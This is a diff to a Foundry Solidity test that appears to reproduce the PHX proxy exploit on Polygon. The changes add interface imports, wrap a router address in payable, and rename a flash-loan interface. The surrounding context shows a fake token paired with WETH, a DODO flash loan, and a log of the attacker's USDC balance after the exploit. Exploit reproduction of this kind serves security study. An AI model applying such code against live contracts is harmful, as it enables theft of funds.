@@ -3,6 +3,11 @@ pragma solidity ^0.8.17;
 
 import "forge-std/Test.sol";
 
+import {IERC20Metadata as IERC20} from "src/interfaces/IERC20Metadata.sol";
+
+import {IUniswapV2Router} from "src/interfaces/IUniswapV2Router.sol";
+import {IDVM} from "src/interfaces/IDVM.sol";
+
 // @Analysis
 // https://twitter.com/HypernativeLabs/status/1633090456157401088
 // @TX
@@ -25,7 +30,7 @@ contract ContractTest is Test {
     IERC20 WETH = IERC20(0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619);
     SHITCOIN MYTOKEN;
     IPHXPROXY phxProxy = IPHXPROXY(0x65BaF1DC6fA0C7E459A36E2E310836B396D1B1de);
-    IUniswapV2Router Router = IUniswapV2Router(0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff);
+    IUniswapV2Router Router = IUniswapV2Router(payable(0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff));
     address dodo = 0x1093ceD81987Bf532c2b7907B2A8525cd0C17295;
 
     function setUp() public {
@@ -45,7 +50,7 @@ contract ContractTest is Test {
         WETH.approve(address(Router), type(uint256).max);
         Router.addLiquidity(address(MYTOKEN), address(WETH), 7 * 1e15, 7 * 1e15, 0, 0, address(this), block.timestamp);
 
-        DVM(dodo).flashLoan(0, 8000 * 1e6, address(this), new bytes(1));
+        IDVM(dodo).flashLoan(0, 8000 * 1e6, address(this), new bytes(1));
 
         emit log_named_decimal_uint(
             "Attacker USDC balance after exploit", USDC.balanceOf(address(this)), USDC.decimals()
